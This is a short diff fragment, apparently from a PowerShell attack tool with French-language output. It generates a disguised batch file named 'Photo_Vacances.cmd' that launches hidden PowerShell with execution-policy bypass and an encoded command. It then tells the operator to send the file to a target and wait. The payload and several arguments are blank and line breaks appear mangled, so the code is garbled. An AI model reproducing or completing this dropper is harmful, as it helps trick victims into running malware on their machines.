@@ -1,0 +1,7 @@
+= @echo offnstart /B powershell -w hidden -nop -ep bypass -EncodedCommand nexit
+Set-Content -Path -Value -Encoding ASCII
+Write-Host 
+Write-Host   [OK] Piege genere : Photo_Vacances.cmd sur le Bureau -f Green
+Write-Host   [i] Envoyez ce fichier a votre cible et attendez... -f Cyan
+Write-Host   [i] En attente (ECHAP pour annuler) -f DarkYellow
+Write-Host 
